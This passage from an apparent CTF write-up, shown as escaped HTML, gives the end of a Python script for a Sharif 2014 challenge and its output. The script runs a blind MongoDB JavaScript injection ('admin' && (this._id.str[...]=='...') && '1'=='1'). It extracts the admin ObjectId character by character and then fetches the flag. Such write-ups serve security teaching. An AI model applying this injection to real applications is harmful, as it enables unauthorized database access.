    &lt;span class="k">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">"[*] Guessing character "&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nb">str&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">c&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">))&lt;/span>
    &lt;span class="k">for&lt;/span> &lt;span class="n">x&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="nb">range&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x10&lt;/span>&lt;span class="p">):&lt;/span>
        &lt;span class="n">letter&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">format&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s">'x'&lt;/span>&lt;span class="p">)&lt;/span>
        &lt;span class="n">query&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s">"admin' && (this._id.str["&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="nb">str&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">c&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="s">"]=='"&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">letter&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="s">"') && '1'=='1"&lt;/span>
        &lt;span class="n">url&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">baseUrl&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">urllib&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">quote_plus&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">query&lt;/span>&lt;span class="p">)&lt;/span>
        &lt;span class="n">response&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">requests&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">get&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">url&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">headers&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">headers&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">cookies&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">cookies&lt;/span>&lt;span class="p">)&lt;/span>
        &lt;span class="k">if&lt;/span> &lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">response&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">text&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">==&lt;/span>&lt;span class="mi">9&lt;/span>&lt;span class="p">:&lt;/span>
            &lt;span class="n">admin_id&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="n">format&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">'x'&lt;/span>&lt;span class="p">)&lt;/span>
            &lt;span class="k">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">"    + Admin id guessed: "&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">admin_id&lt;/span>&lt;span class="p">)&lt;/span>
            &lt;span class="k">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">""&lt;/span>&lt;span class="p">)&lt;/span>
            &lt;span class="k">break&lt;/span>

        &lt;span class="n">time&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sleep&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span>

&lt;span class="c"># Getting the flag&lt;/span>
&lt;span class="k">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">"[*] Go for the flag!"&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">flag_id&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">format&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">int&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">admin_id&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">16&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">'x'&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">url&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s">"http://ctf.sharif.edu:25489/api.php?q=flag&id="&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">flag_id&lt;/span>
&lt;span class="n">response&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">requests&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">get&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">url&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">headers&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">headers&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">cookies&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">cookies&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">print&lt;/span> &lt;span class="n">response&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">text
&lt;/span></code></pre>
> 
> <pre><code class="language-bash" data-lang="bash">&lt;span class="c"># ./sharif14_pwnit.py&lt;/span>
&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Guessing character 1
    + Admin id guessed: 5

&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Guessing character 2
    + Admin id guessed: 53

&lt;span class="o">[&lt;/span>...&lt;span class="o">]&lt;/span>

&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Guessing character 23
    + Admin id guessed: 53fadd3d7137a495319e10f

&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Guessing character 24
    + Admin id guessed: 53fadd3d7137a495319e10f3


&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Go &lt;span class="k">for&lt;/span> the flag!

array&lt;span class="o">(&lt;/span>2&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
  &lt;span class="o">[&lt;/span>&lt;span class="s2">"_id"&lt;/span>&lt;span class="o">]=&lt;/span>&gt;
  object&lt;span class="o">(&lt;/span>MongoId&lt;span class="o">)&lt;/span>&lt;span class="c">#7 (1) {&lt;/span>
    &lt;span class="o">[&lt;/span>&lt;span class="s2">"$id"&lt;/span>&lt;span class="o">]=&lt;/span>&gt;
    string&lt;span class="o">(&lt;/span>24&lt;span class="o">)&lt;/span> &lt;span class="s2">"53fadd3d7137a495319e10f4"&lt;/span>
  &lt;span class="o">}&lt;/span>
  &lt;span class="o">[&lt;/span>&lt;span class="s2">"flag"&lt;/span>&lt;span class="o">]=&lt;/span>&gt;
  string&lt;span class="o">(&lt;/span>30&lt;span class="o">)&lt;/span> &lt;span class="s2">"9fmTOOdbm1A76o40Bb9N3wpqvozdJI"&lt;/span>
&lt;span class="o">}&lt;/span></code></pre>

Source : <a title="Blog Dul Ac" href="http://blog.dul.ac/2014/10/SHARIF_QUALS_14/" target="_blank">http://blog.dul.ac/2014/10/SHARIF_QUALS_14/</a>